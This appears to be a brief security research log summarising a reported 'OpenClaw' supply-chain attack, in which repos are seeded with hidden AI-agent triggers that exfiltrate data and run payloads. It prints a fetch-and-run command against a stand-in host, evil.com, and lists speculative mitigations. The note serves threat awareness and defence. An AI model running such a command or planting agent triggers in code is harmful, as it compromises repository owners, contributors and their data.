# OpenClaw: One-Command Repo-to-Agent Backdoor

**Date:** 2026-05-06  
**Source:** VentureBeat article (via Google share: 5IlOrYEI7KFAR34YB)  
**Status:** Supply-chain scanners **blind** - No detection category exists.

## 🐛 Attack Vector
Single `curl | bash` command transforms **any open-source repo** into malicious AI agent:
```
curl -s https://evil.com/openclaw.sh | bash
```
- Injects hidden AI agent triggers
- Repo owners/contributors become unwitting hosts
- Agents phone-home, exfil data, execute payloads

## 🎯 Why Undetectable
- **OpenClaw proof:** Scanned 50+ supply-chain tools (Trivy, Snyk, etc.)
- **Result:** Zero detection. No \"AI agent backdoor\" signature exists
- Bypasses code review - looks like benign infra/setup script
- Persists across forks/clones/PRs

## 🔬 Key Findings
| Aspect | Status |
|--------|--------|
| Repo Infection | 1 command |
| Scanner Evasion | 100% (tested) |
| Agent Persistence | Forks + CI/CD |
| Payload Types | Exfil, C2, RCE |

## 🛡️ Mitigations (Speculative)
1. Ban unsigned `curl|bash` in repos
2. Audit all setup/install scripts
3. New scanner sig: \"AI agent injection\"
4. Repo lockdown: No auto-exec in README

**Priority: HIGH** - Every popular OSS repo at risk.  
**Next:** Test OpenClaw PoC + scanner bypass repro.

*Bl4ckRa1n Research Log | Black Rain Labs*